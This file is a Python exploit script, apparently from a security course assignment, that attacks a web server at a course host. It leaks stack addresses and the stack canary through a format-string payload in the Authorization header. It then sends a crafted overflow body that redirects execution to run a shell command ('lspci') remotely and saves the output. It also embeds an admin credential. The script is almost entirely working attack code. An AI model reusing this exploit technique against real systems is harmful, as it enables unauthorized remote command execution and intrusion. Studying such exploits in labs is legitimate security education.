url = "http://project-2.csec.chatzi.org:8000"
pas="admin:8c6e2f34df08e2f879e61eeb9e8ba96f8d9e96d8033870f80127567d270d7d96"

command = "lspci"

from requests import Request, Session
import base64
import time
import requests
import codecs

addr_last = None		
addr_semi_last = None	
canary = None 
addr_3rd = None	
addr_9th = None

def transform_address(address):

	mybytes= address.to_bytes(4, byteorder='little')
	mystring = ""
	for b in mybytes:
		if int(b) != 0:
			mystring += '%c' % int(b)
		else:
			mystring += '%c' % 0x26
	return mystring



def set_variables():
	global addr_last
	global addr_semi_last
	global canary
	global addr_3rd
	global addr_9th

	payl = "%p %d %p %p %p %p %s %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p:psswd"

	headers = {"Authorization":"Basic " + base64.b64encode(payl.encode("utf-8")).decode("utf-8")}
	response = requests.get(url,headers = headers)

	mystring = response.headers['WWW-Authenticate'][13:-1].split(' ')



	addr_last = int(mystring[-1],16)
	addr_semi_last = int(mystring[-2],16)
	canary = int(mystring[-4],16)
	addr_3rd = int(mystring[4],16)

	addr_9th = int(mystring[-9],16)

	time.sleep(1)

set_variables()


guessed_address=addr_last - 0xB8	
send_file = addr_9th - 0x1AA5A0  


old_ebp = addr_last
old_esi = 0xF7F31000 #####Could be anything
old_ebx = canary


shutdown = addr_3rd - 0x1C7 + 0x32	#A few instructions after return value of post param, 



data=""
data +=  92*"!" 
data += transform_address(guessed_address + 152 + len(command))
data += 8*"!" + 4*"-" + 4*"-"+4*"!"
data += transform_address(guessed_address)
data += 4*"-" 
data +=  transform_address(canary)
data +=  transform_address(old_ebx) 
data +=  transform_address(old_esi) 
data +=  transform_address(old_ebp)
data +=  transform_address(send_file) 
data +=  transform_address(shutdown)
data +=  transform_address(guessed_address+152)
data +=  command
data += '\0'

s = Session()

req = Request('POST', url, data=data)

prepped = req.prepare()
prepped.headers['Content-Length'] = 66
prepped.headers['Authorization'] = "Basic " + base64.b64encode(pas.encode("utf-8")).decode("utf-8")
response = s.send(prepped)



content = str(response.content)[84:-1] #Result of the instruction


hex_string = content

# Convert hex escape sequences to binary
decoded_string = codecs.escape_decode(hex_string)[0].decode()

# print(response.status_code)

# Print the converted string to a file
with open('command_output.txt', 'w') as file:
    file.write(decoded_string)
    print("String saved to command_output.txt")


